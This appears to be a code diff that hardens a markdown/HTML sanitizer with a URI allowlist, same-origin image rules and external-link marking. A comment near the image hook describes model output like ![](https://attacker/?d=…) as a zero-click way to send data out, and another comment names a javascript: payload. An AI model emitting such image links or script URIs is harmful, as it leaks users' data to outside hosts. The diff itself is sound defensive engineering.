@@ -67,6 +67,47 @@ const ALLOWED_ATTR = [
   'data-fence-key'
 ]
 
+/**
+ * URI 白名单（防护批② B2-8；用户裁决 2026-10-21 第 3 条）：
+ * **http/https 保留**，`#锚点`/相对路径保留，`data:image/*`（非 svg）保留；**其余协议一律剥离**
+ * （含 `javascript:` / `vbscript:` / `file:` / 非图片 `data:`）。
+ *
+ * <p>判据抄 DOMPurify 默认正则的"scheme 形态"分支（`[a-z+.-]+` 后必须紧跟非 scheme 字符或结尾），
+ * 因此 `javascript:alert(1)` 不会被当成"普通相对路径"放行。
+ */
+export const ALLOWED_URI_REGEXP =
+  /^(?:https?:|data:image\/(?!svg)|#|\/(?!\/)|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i
+
+/** 图片 src 的额外约束（比 URI 白名单更严）：只放行 data:image/*（非 svg）与同源地址。 */
+export function isAllowedImageSrc(src: string): boolean {
+  if (!src) return false
+  const value = src.trim()
+  if (/^data:image\/(?!svg)/i.test(value)) return true
+  if (/^[a-z][a-z0-9+.\-]*:/i.test(value) || value.startsWith('//')) {
+    // 绝对地址 / 协议相对地址：只有同源才放行（图片是"无需点击即出网"的外泄通道）
+    return isSameOrigin(value)
+  }
+  return true
+}
+
+/** 是否同源（用浏览器解析后的 origin 比对；测试环境 jsdom 同样可用）。 */
+export function isSameOrigin(url: string): boolean {
+  try {
+    const base = typeof window !== 'undefined' && window.location ? window.location.href : 'http://localhost/'
+    const parsed = new URL(url, base)
+    return parsed.origin === new URL(base).origin
+  } catch {
+    return false
+  }
+}
+
+/** 是否站外 http(s) 链接（决定加 rel / 新窗口 / 外链标记）。 */
+export function isExternalHref(href: string): boolean {
+  if (!href) return false
+  return /^https?:/i.test(href.trim()) && !isSameOrigin(href)
+}
+
+
 /** 表格双区三区标记类（R-165 S5a，渲染层 wrapTables 生成）——hook 只认这三个标记类，
  *  div 上随行的 Tailwind 工具类同 div 保留（表格版式全在工具类里，不能被净化剥掉）。
  *  问题1 偏差修正批（aj04）：表头行由「单容器 + pr-[6px] 补偿条」改为
@@ -347,12 +388,54 @@ DOMPurify.addHook('afterSanitizeAttributes', (node) => {
       node.setAttribute('type', 'button')
     }
   }
+  // 防护批② B2-8：图片只认同源与 data:image/*（模型输出一句 ![](https://attacker/?d=…) 就能
+  // 让浏览器自动出网，无需用户点击 —— 这正是 MSRC 列的第一种外泄手法）。
+  if (node.tagName === 'IMG') {
+    const src = node.getAttribute('src') ?? ''
+    if (!isAllowedImageSrc(src)) {
+      node.remove()
+    }
+  }
+  // 防护批② B2-8：外链一律 rel="noopener noreferrer nofollow"；站外 http(s) 另加 target 与可见标记。
+  if (node.tagName === 'A') {
+    node.setAttribute('rel', 'noopener noreferrer nofollow')
+    const href = node.getAttribute('href') ?? ''
+    if (isExternalHref(href)) {
+      node.setAttribute('target', '_blank')
+      const cls = node.getAttribute('class') ?? ''
+      node.setAttribute('class', cls ? `${cls} md-ext-link` : 'md-ext-link')
+      node.appendChild(createExternalLinkIcon())
+    }
+  }
 })
+
+/** 外链标记图标（自绘 svg，禁 emoji —— 用户裁决 2026-10-21 第 10 条）。 */
+function createExternalLinkIcon(): Element {
+  const doc = typeof document !== 'undefined' ? document : (globalThis as { document?: Document }).document
+  const ns = 'http://www.w3.org/2000/svg'
+  const svg = doc!.createElementNS(ns, 'svg')
+  svg.setAttribute('viewBox', '0 0 12 12')
+  svg.setAttribute('width', '10')
+  svg.setAttribute('height', '10')
+  svg.setAttribute('class', 'md-ext-icon inline-block ml-0.5 align-baseline opacity-70')
+  svg.setAttribute('aria-hidden', 'true')
+  const path = doc!.createElementNS(ns, 'path')
+  path.setAttribute('d', 'M4 8 L8.5 3.5 M5 3.5 H8.5 V7')
+  path.setAttribute('fill', 'none')
+  path.setAttribute('stroke', 'currentColor')
+  path.setAttribute('stroke-width', '1.2')
+  path.setAttribute('stroke-linecap', 'round')
+  path.setAttribute('stroke-linejoin', 'round')
+  svg.appendChild(path)
+  return svg as unknown as Element
+}
+
 
 function sanitizeHtml(html: string): string {
   return DOMPurify.sanitize(html, {
     ALLOWED_TAGS,
     ALLOWED_ATTR,
+    ALLOWED_URI_REGEXP,
     ALLOW_DATA_ATTR: false
   })
 }
